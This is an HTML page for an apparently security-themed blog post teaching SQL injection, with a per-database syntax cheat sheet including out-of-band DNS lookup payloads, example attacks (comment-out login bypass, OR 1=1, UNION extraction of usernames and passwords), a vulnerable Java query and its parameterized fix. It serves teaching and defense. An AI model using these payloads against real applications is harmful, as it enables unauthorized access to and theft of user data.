@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" type="image/x-icon" href="../../images/favicon.ico">
+    <title>SQL Injection</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
+    <link href="../../assets/css/main.css" rel="stylesheet" id="main-theme-link"/>
+    <link href="../../assets/css/blog.css" rel="stylesheet" />
+  </head>
+  <body>
+    <div id="topbar">
+      <div class="topbar-children-top">
+        <div class="switch-container">
+          <!-- Rounded switch -->
+          <label class="switch">
+            <input type="checkbox" id="dark-mode-checkbox" />
+            <span class="slider round"></span>
+          </label>
+        </div>
+      </div>
+      <div class="topbar-children-top">
+        <div class="icon-bar">
+          <a href="https://t.me/fibaruSecurity"><i class="fa fa-fw fa-telegram"></i></a>
+          <a href="https://www.reddit.com/r/fibaruSecurity/"><i class="fa fa-fw fa-reddit"></i></a>
+          <a href="https://twitter.com/FibaruSec"><i class="fa fa-fw fa-twitter-square"></i></a>
+        </div>
+      </div>
+
+      <div class="topbar-children">
+        <!-- griffin logo -->
+        <img
+          id="griffin"
+          src="../../images/techno_griffin.svg"
+          width="40"
+          height="60"
+          alt="griffin"
+        />
+
+        <!-- navigational buttons -->
+        <div class="navbar">
+          <!-- home -->
+          <div class="dropdown">
+            <button class="dropbtn" onclick="location.href='../../index.html'">
+              <i class="fa fa-fw fa-home"></i>
+              Home
+              <i class="fa fa-caret-down"></i>
+            </button>
+            <div class="dropdown-content">
+              <a href="../../index.html#main-image-header">Header Images</a>
+              <a href="../../index.html#our-features-slide">Slide</a>
+              <a href="../../index.html#reviews-about-us">Reviews</a>
+              <a href="../../index.html#clients-working-with-us">Clients</a>
+              <a href="../../index.html#brute-demonstration">Brute Force</a>
+            </div>
+          </div>
+
+          <!-- archive -->
+          <div class="dropdown">
+            <button class="dropbtn" onclick="location.href='../site-map.html'">
+              <i class="fa fa-fw fa-pencil"></i>
+              Archive
+              <i class="fa fa-caret-down"></i>
+            </button>
+            <div class="dropdown-content">
+              <a href="../site-map.html">Site Map</a>
+              <a href="../blog-archive.html">Blog Archive</a>
+              <a href="../gallery.html">Gallery</a>
+            </div>
+          </div>
+
+          <!-- about us -->
+          <div class="dropdown">
+            <button class="dropbtn" onclick="location.href='../about.html'">
+              <i class="fa fa-fw fa-info-circle"></i>
+              About Us
+              <i class="fa fa-caret-down"></i>
+            </button>
+            <div class="dropdown-content">
+              <a href="../about.html#about-us">About Us</a>
+              <a href="../about.html#contact-us">Contact Us</a>
+              <a href="../about.html#legal-policy">Legal Notice</a>
+              <a href="../about.html#privacy-policy">Privacy Policy</a>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="topbar-children">
+        <div class="login-bar">
+          <a href="../login.html"><i class="fa fa-fw fa-user"></i> Login</a>
+          <a href="../register.html"
+            ><i class="fa fa-fw fa-edit"></i> Register</a
+          >
+          <a href=""><i class="fa fa-fw fa-search"></i> Search</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="blog-content">
+      <h1>SQL Injection</h1>
+      <div class="info-card">
+        <p>by Onur Admin</p>
+        <p id="date">24 / 04 / 2022</p>
+        <hr />
+      </div>
+
+      <div class="post-text">
+        <p>
+          In this section, we'll explain what SQL injection is, describe some
+          common examples, explain how to find and exploit various kinds of SQL
+          injection vulnerabilities, and summarize how to prevent SQL injection.
+        </p>
+        <img alt="SQL injection" src="../../images/sql-injection.svg" />
+        <a id="what-is-sql-injection-sqli" href="#what-is-sql-injection-sqli"
+          ><h2>What is SQL injection (SQLi)?</h2></a
+        >
+
+        <p>
+          SQL injection is a web security vulnerability that allows an attacker
+          to interfere with the queries that an application makes to its
+          database. It generally allows an attacker to view data that they are
+          not normally able to retrieve. This might include data belonging to
+          other users, or any other data that the application itself is able to
+          access. In many cases, an attacker can modify or delete this data,
+          causing persistent changes to the application's content or behavior.
+        </p>
+        <p>
+          In some situations, an attacker can escalate an SQL injection attack
+          to compromise the underlying server or other back-end infrastructure,
+          or perform a denial-of-service attack.
+        </p>
+
+        <a
+          id="what-is-the-impact-of-a-successful-sql-injection-attack"
+          href="#what-is-the-impact-of-a-successful-sql-injection-attack"
+          ><h2>What is the impact of a successful SQL injection attack?</h2></a
+        >
+        <p>
+          A successful SQL injection attack can result in unauthorized access to
+          sensitive data, such as passwords, credit card details, or personal
+          user information. Many high-profile data breaches in recent years have
+          been the result of SQL injection attacks, leading to reputational
+          damage and regulatory fines. In some cases, an attacker can obtain a
+          persistent backdoor into an organization's systems, leading to a
+          long-term compromise that can go unnoticed for an extended period.
+        </p>
+        <a id="sql-injection-examples" href="#sql-injection-examples"
+          ><h2>SQL injection examples</h2></a
+        >
+        <p>
+          There are a wide variety of SQL injection vulnerabilities, attacks,
+          and techniques, which arise in different situations. Some common SQL
+          injection examples include:
+        </p>
+        <ul>
+          <li>
+            Retrieving hidden data, where you can modify an SQL query to return
+            additional results.
+          </li>
+          <li>
+            Subverting application logic, where you can change a query to
+            interfere with the application's logic.
+          </li>
+          <li>
+            UNION attacks, where you can retrieve data from different database
+            tables.
+          </li>
+          <li>
+            Examining the database, where you can extract information about the
+            version and structure of the database.
+          </li>
+          <li>
+            Blind SQL injection, where the results of a query you control are
+            not returned in the application's responses.
+          </li>
+        </ul>
+
+        <div class="sql-table-wrapper">
+          <table class="sql-table">
+            <caption>SQL Injection Table</caption>
+            <thead>
+              <tr>
+                <th>Useful Syntax</th>
+                <th>Oracle</th>
+                <th>Windows</th>
+                <th>PostgreSQL</th>
+                <th>MySQL
+                </th>
+              </tr>
+              <tr>
+                <td>String Concatenation</td>
+                <td><code>'foo'||'bar'</code></td>
+                <td><code>'foo'+'bar'</code></td>
+                <td><code>'foo'||'bar'</code></td>
+                <td><code>'foo' 'bar'</code> </td>
+              </tr>
+              <tr>
+                <td>Substring</td>
+                <td>
+                  <code>
+                    SUBSTR('foobar', 4, 2)</code></td>
+                <td>
+                  <code>
+                    SUBSTRING('foobar', 4, 2)</code></td>
+                <td>
+                  <code>
+                    SUBSTRING('foobar', 4, 2)</code></td>
+                <td><code>SUBSTRING('foobar', 4, 2)</code></td>
+              </tr>
+              <tr>
+                <td>Conditional Errors</td>
+                <td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+                  </code></td>
+                <td>
+                  <code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+                  </code></td>
+                <td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
+                <td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+                  </code></td>
+              </tr>
+              <tr>
+                <td>Time Delays</td>
+                <td>
+                  <code>
+                    dbms_pipe.receive_message(('a'),10)</code></td>
+                <td><code>WAITFOR DELAY '0:0:10'</code></td>
+                <td><code>SELECT pg_sleep(10)</code></td>
+                <td><code>SELECT sleep(10)</code></td>
+              </tr>
+              <tr>
+                <td>DNS Lookup</td>
+                <td><code>SELECT extractvalue(xmltype('&lt;?xml version="1.0"
+                    encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM
+                    "http://example.com/"&gt; %remote;]&gt;'),'/l') FROM
+                    dual</code></td>
+                <td><code>exec master..xp_dirtree 'example.com'</code></td>
+                <td><code>copy (SELECT '') to program 'nslookup example.com'</code></td>
+                <td><code>LOAD_FILE('example.com/file')</code><br>
+                  <code>SELECT ... INTO OUTFILE 'example.com/file1'</code></td>
+              </tr>
+            </thead>
+            <tbody>
+  
+            </tbody>
+          </table>
+        </div>
+
+        <a id="retrieving-hidden-data" href="#retrieving-hidden-data"
+          ><h2>Retrieving hidden data</h2></a
+        >
+        <p>
+          Consider a shopping application that displays products in different
+          categories. When the user clicks on the Gifts category, their browser
+          requests the URL:
+        </p>
+        <code class="code-block"
+          >https://insecure-website.com/products?category=Gifts</code
+        >
+        <p>
+          This causes the application to make an SQL query to retrieve details
+          of the relevant products from the database:
+        </p>
+        <code class="code-block"
+          >SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code
+        >
+        <p>This SQL query asks the database to return:</p>
+        <ul>
+          <li>all details (*)</li>
+          <li>from the products table</li>
+          <li>where the category is Gifts</li>
+          <li>and released is 1.</li>
+        </ul>
+        <p>
+          The restriction <code>released = 1</code> is being used to hide
+          products that are not released. For unreleased products, presumably
+          <code>released = 0</code>.
+        </p>
+        <p>
+          The application doesn't implement any defenses against SQL injection
+          attacks, so an attacker can construct an attack like:
+        </p>
+        <code class="code-block"
+          >https://insecure-website.com/products?category=Gifts'--</code
+        >
+        <p>This results in the SQL query:</p>
+        <code class="code-block"
+          >SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1</code
+        >
+        <p>
+          The key thing here is that the double-dash sequence <code>--</code> is
+          a comment indicator in SQL, and means that the rest of the query is
+          interpreted as a comment. This effectively removes the remainder of
+          the query, so it no longer includes <code>AND released = 1</code>.
+          This means that all products are displayed, including unreleased
+          products.
+        </p>
+        <p>
+          Going further, an attacker can cause the application to display all
+          the products in any category, including categories that they don't
+          know about:
+        </p>
+        <code class="code-block"
+          >https://insecure-website.com/products?category=Gifts'+OR+1=1--</code
+        >
+        <p>This results in the SQL query:</p>
+        <code class="code-block"
+          >SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1</code
+        >
+        <p>
+          The modified query will return all items where either the category is
+          Gifts, or 1 is equal to 1. Since
+          <code>1=1</code> is always true, the query will return all items.
+        </p>
+
+        <a
+          id="subverting-application-logic"
+          href="#subverting-application-logic"
+          ><h2>Subverting application logic</h2></a
+        >
+        <p>
+          Consider an application that lets users log in with a username and
+          password. If a user submits the username
+          <code>wiener</code> and the password <code>bluecheese</code>, the
+          application checks the credentials by performing the following SQL
+          query:
+        </p>
+        <code class="code-block"
+          >SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</code
+        >
+        <p>
+          If the query returns the details of a user, then the login is
+          successful. Otherwise, it is rejected.
+        </p>
+        <p>
+          Here, an attacker can log in as any user without a password simply by
+          using the SQL comment sequence <code>--</code> to remove the password
+          check from the <code>WHERE</code> clause of the query. For example,
+          submitting the username <code>administrator'--</code> and a blank
+          password results in the following query:
+        </p>
+        <code class="code-block"
+          >SELECT * FROM users WHERE username = 'administrator'--' AND password = ''</code
+        >
+        <p>
+          This query returns the user whose username is
+          <code>administrator</code> and successfully logs the attacker in as
+          that user.
+        </p>
+
+        <a
+          id="retrieving-data-from-other-database-tables"
+          href="#retrieving-data-from-other-database-tables"
+          ><h2>Retrieving data from other database tables</h2></a
+        >
+        <p>
+          In cases where the results of an SQL query are returned within the
+          application's responses, an attacker can leverage an SQL injection
+          vulnerability to retrieve data from other tables within the database.
+          This is done using the
+          <code>UNION</code> keyword, which lets you execute an additional
+          <code>SELECT</code> query and append the results to the original
+          query.
+        </p>
+        <p>
+          For example, if an application executes the following query containing
+          the user input "Gifts":
+        </p>
+        <code class="code-block"
+          >SELECT name, description FROM products WHERE category = 'Gifts'</code
+        >
+        <p>then an attacker can submit the input:</p>
+        <code class="code-block"
+          >' UNION SELECT username, password FROM users--</code
+        >
+        <p>
+          This will cause the application to return all usernames and passwords
+          along with the names and descriptions of products.
+        </p>
+
+        <a id="examining-the-database" href="#examining-the-database"
+          ><h2>Examining the database</h2></a
+        >
+        <p>
+          Following initial identification of an SQL injection vulnerability, it
+          is generally useful to obtain some information about the database
+          itself. This information can often pave the way for further
+          exploitation.
+        </p>
+        <p>
+          You can query the version details for the database. The way that this
+          is done depends on the database type, so you can infer the database
+          type from whichever technique works. For example, on Oracle you can
+          execute:
+        </p>
+        <code class="code-block">SELECT * FROM v$version</code>
+        <p>
+          You can also determine what database tables exist, and which columns
+          they contain. For example, on most databases you can execute the
+          following query to list the tables:
+        </p>
+        <code class="code-block">SELECT * FROM information_schema.tables</code>
+
+        <a
+          id="blind-sql-injection-vulnerabilities"
+          href="#blind-sql-injection-vulnerabilities"
+          ><h2>Blind SQL injection vulnerabilities</h2></a
+        >
+        <p>
+          Many instances of SQL injection are blind vulnerabilities. This means
+          that the application does not return the results of the SQL query or
+          the details of any database errors within its responses. Blind
+          vulnerabilities can still be exploited to access unauthorized data,
+          but the techniques involved are generally more complicated and
+          difficult to perform.
+        </p>
+        <p>
+          Depending on the nature of the vulnerability and the database
+          involved, the following techniques can be used to exploit blind SQL
+          injection vulnerabilities:
+        </p>
+        <ul>
+          <li>
+            You can change the logic of the query to trigger a detectable
+            difference in the application's response depending on the truth of a
+            single condition. This might involve injecting a new condition into
+            some Boolean logic, or conditionally triggering an error such as a
+            divide-by-zero.
+          </li>
+          <li>
+            You can conditionally trigger a time delay in the processing of the
+            query, allowing you to infer the truth of the condition based on the
+            time that the application takes to respond.
+          </li>
+          <li>
+            You can trigger an out-of-band network interaction, using OAST
+            techniques. This technique is extremely powerful and works in
+            situations where the other techniques do not. Often, you can
+            directly exfiltrate data via the out-of-band channel, for example by
+            placing the data into a DNS lookup for a domain that you control.
+          </li>
+        </ul>
+
+        <a
+          id="how-to-detect-sql-injection-vulnerabilities"
+          href="#how-to-detect-sql-injection-vulnerabilities"
+          ><h2>How to detect SQL injection vulnerabilities</h2></a
+        >
+        <p>
+          SQL injection can be detected manually by using a systematic set of
+          tests against every entry point in the application. This typically
+          involves:
+        </p>
+        <ul>
+          <li>
+            Submitting the single quote character <code>'</code> and looking for
+            errors or other anomalies.
+          </li>
+          <li>
+            Submitting some SQL-specific syntax that evaluates to the base
+            (original) value of the entry point, and to a different value, and
+            looking for systematic differences in the resulting application
+            responses.
+          </li>
+          <li>
+            Submitting Boolean conditions such as <code>OR 1=1</code> and
+            <code>OR 1=2</code>, and looking for differences in the
+            application's responses.
+          </li>
+          <li>
+            Submitting payloads designed to trigger time delays when executed
+            within an SQL query, and looking for differences in the time taken
+            to respond.
+          </li>
+          <li>
+            Submitting OAST payloads designed to trigger an out-of-band network
+            interaction when executed within an SQL query, and monitoring for
+            any resulting interactions.
+          </li>
+        </ul>
+
+        <a
+          id="sql-injection-in-different-parts-of-the-query"
+          href="#sql-injection-in-different-parts-of-the-query"
+          ><h2>SQL injection in different parts of the query</h2></a
+        >
+        <p>
+          Most SQL injection vulnerabilities arise within the
+          <code>WHERE</code> clause of a <code>SELECT</code> query. This type of
+          SQL injection is generally well-understood by experienced testers.
+        </p>
+        <p>
+          But SQL injection vulnerabilities can in principle occur at any
+          location within the query, and within different query types. The most
+          common other locations where SQL injection arises are:
+        </p>
+        <ul>
+          <li>
+            In <code>UPDATE</code> statements, within the updated values or the
+            <code>WHERE</code> clause.
+          </li>
+          <li>
+            In <code>INSERT</code> statements, within the inserted values.
+          </li>
+          <li>
+            In <code>SELECT</code> statements, within the table or column name.
+          </li>
+          <li>
+            In <code>SELECT</code> statements, within the
+            <code>ORDER BY</code> clause.
+          </li>
+        </ul>
+
+        <a id="second-order-sql-injection" href="second-order-sql-injection"
+          ><h2>Second-order SQL injection</h2></a
+        >
+        <p>
+          First-order SQL injection arises where the application takes user
+          input from an HTTP request and, in the course of processing that
+          request, incorporates the input into an SQL query in an unsafe way.
+        </p>
+        <p>
+          In second-order SQL injection (also known as stored SQL injection),
+          the application takes user input from an HTTP request and stores it
+          for future use. This is usually done by placing the input into a
+          database, but no vulnerability arises at the point where the data is
+          stored. Later, when handling a different HTTP request, the application
+          retrieves the stored data and incorporates it into an SQL query in an
+          unsafe way.
+        </p>
+        <img
+          alt="Second-order SQL injection"
+          src="../../images/second-order-sql-injection.svg"
+        />
+        <p>
+          Second-order SQL injection often arises in situations where developers
+          are aware of SQL injection vulnerabilities, and so safely handle the
+          initial placement of the input into the database. When the data is
+          later processed, it is deemed to be safe, since it was previously
+          placed into the database safely. At this point, the data is handled in
+          an unsafe way, because the developer wrongly deems it to be trusted.
+        </p>
+
+        <a id="database-specific-factors" href="database-specific-factors"
+          ><h2>Database-specific factors</h2></a
+        >
+        <p>
+          Some core features of the SQL language are implemented in the same way
+          across popular database platforms, and so many ways of detecting and
+          exploiting SQL injection vulnerabilities work identically on different
+          types of database.
+        </p>
+        <p>
+          However, there are also many differences between common databases.
+          These mean that some techniques for detecting and exploiting SQL
+          injection work differently on different platforms. For example:
+        </p>
+        <ul>
+          <li>Syntax for string concatenation.</li>
+          <li>Comments.</li>
+          <li>Batched (or stacked) queries.</li>
+          <li>Platform-specific APIs.</li>
+          <li>Error messages.</li>
+        </ul>
+
+        <a
+          id="how-to-prevent-sql-injection"
+          href="#how-to-prevent-sql-injection"
+          ><h2>How to prevent SQL injection</h2></a
+        >
+        <p>
+          Most instances of SQL injection can be prevented by using
+          parameterized queries (also known as prepared statements) instead of
+          string concatenation within the query.
+        </p>
+        <p>
+          The following code is vulnerable to SQL injection because the user
+          input is concatenated directly into the query:
+        </p>
+        <code class="code-block"
+          >String query = "SELECT * FROM products WHERE category = '"+ input +
+          "'"; Statement statement = connection.createStatement(); ResultSet
+          resultSet = statement.executeQuery(query);</code
+        >
+        <p>
+          This code can be easily rewritten in a way that prevents the user
+          input from interfering with the query structure:
+        </p>
+        <code class="code-block"
+          >PreparedStatement statement = connection.prepareStatement("SELECT *
+          FROM products WHERE category = ?"); statement.setString(1, input);
+          ResultSet resultSet = statement.executeQuery();</code
+        >
+        <p>
+          Parameterized queries can be used for any situation where untrusted
+          input appears as data within the query, including the
+          <code>WHERE</code> clause and values in an <code>INSERT</code> or
+          <code>UPDATE</code> statement. They can't be used to handle untrusted
+          input in other parts of the query, such as table or column names, or
+          the <code>ORDER BY</code> clause. Application functionality that
+          places untrusted data into those parts of the query will need to take
+          a different approach, such as white-listing permitted input values, or
+          using different logic to deliver the required behavior.
+        </p>
+        <p>
+          For a parameterized query to be effective in preventing SQL injection,
+          the string that is used in the query must always be a hard-coded
+          constant, and must never contain any variable data from any origin. Do
+          not be tempted to decide case-by-case whether an item of data is
+          trusted, and continue using string concatenation within the query for
+          cases that are considered safe. It is all too easy to make mistakes
+          about the possible origin of data, or for changes in other code to
+          violate assumptions about what data is tainted.
+        </p>
+      </div>
+
+      <div class="related-posts-wrapper">
+        <a id="related" href="#related"><h3>Related Posts</h3></a>
+        <hr id="after-related" />
+
+        <ul class="related-posts img-list">
+          <li>
+            <a href="./host-header.html" class="inner">
+              <div class="li-img">
+                <img
+                  src="../../images/host-header-attacks.jpg"
+                  alt="Http Host Header Attacks"
+                />
+              </div>
+              <div class="li-text">
+                <h3 class="li-head">Http Host Header Attacks</h3>
+                <div class="li-sub">
+                  <p>Learn how headers can be used to attack.</p>
+                </div>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="./logic-flaws.html" class="inner">
+              <div class="li-img">
+                <img
+                  src="../../images/logic-flaws.jpg"
+                  alt="Business Logic Vulnerabilities"
+                />
+              </div>
+              <div class="li-text">
+                <h3 class="li-head">Business Logic Vulnerabilities</h3>
+                <div class="li-sub">
+                  <p>Read about IDORS and how to mitigate them.</p>
+                </div>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="./file-upload.html" class="inner">
+              <div class="li-img">
+                <img
+                  src="../../images/file-upload-vulnerabilities.jpg"
+                  alt="File Upload Vulnerabilities"
+                />
+              </div>
+              <div class="li-text">
+                <h3 class="li-head">File Upload Vulnerabilities</h3>
+                <div class="li-sub">
+                  <p>Learn how to exploit file upload sections.</p>
+                </div>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="./authentication.html" class="inner">
+              <div class="li-img">
+                <img
+                  src="../../images/password-reset-poisoning.svg"
+                  alt="Authentication Vulnerabilities"
+                />
+              </div>
+              <div class="li-text">
+                <h3 class="li-head">Authentication Vulnerabilities</h3>
+                <div class="li-sub">
+                  <p>Learn how to exploit login vulnerabilities.</p>
+                </div>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="./dom-based.html" class="inner">
+              <div class="li-img">
+                <img
+                  src="../../images/dom.png"
+                  alt="DOM-based Vulnerabilities"
+                />
+              </div>
+              <div class="li-text">
+                <h3 class="li-head">DOM-based Vulnerabilities</h3>
+                <div class="li-sub">
+                  <p>Learn how DOM vulnerabilities arise.</p>
+                </div>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="./file-path-traversal.html" class="inner">
+              <div class="li-img">
+                <img
+                  src="../../images/directory-traversal.svg"
+                  alt="Directory Traversal"
+                />
+              </div>
+              <div class="li-text">
+                <h3 class="li-head">Directory Traversal</h3>
+                <div class="li-sub">
+                  <p>Read about path traversal vulnerability.</p>
+                </div>
+              </div>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <script src="../../assets/js/darkMode.js"></script>
+  </body>
+</html>
